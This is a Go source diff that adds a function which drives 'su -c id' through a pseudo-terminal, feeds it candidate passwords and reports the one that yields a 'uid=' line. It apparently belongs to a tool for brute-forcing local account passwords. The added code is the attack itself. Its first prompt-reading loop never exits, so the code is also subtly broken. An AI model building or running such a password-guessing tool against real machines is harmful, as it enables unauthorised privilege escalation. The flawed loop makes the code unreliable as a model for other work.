@@ -79,6 +79,41 @@ func main() {
 	}
 }
 
+func testCandidate(username, candidate string, pty, tty *os.File) {
+	c := exec.Command("su", "-c", "id", username)
+	defer c.Wait()
+	c.Stdout = tty
+	c.Stderr = tty
+	c.Stdin = tty
+
+	if err := c.Start(); err != nil {
+		log.Fatal(err)
+	}
+
+	buffer := make([]byte, 100)
+
+	n, _ := pty.Read(buffer)
+	for {
+		if !strings.HasPrefix(string(buffer[:n]), "Password:") {
+			n, _ = pty.Read(buffer)
+		}
+	}
+
+	pty.Write([]byte(candidate + "\n"))
+
+	n, _ = pty.Read(buffer)
+	for {
+		result := string(buffer[:n])
+		if strings.HasPrefix(result, "su: Authentication failure") {
+			break
+		} else if strings.HasPrefix(result, "uid=") {
+			log.Printf("success with %s\n", candidate)
+			os.Exit(0)
+		}
+		n, _ = pty.Read(buffer)
+	}
+}
+
 func open() (pty, tty *os.File, err error) {
 	p, err := os.OpenFile("/dev/ptmx", os.O_RDWR, 0)
 	if err != nil {
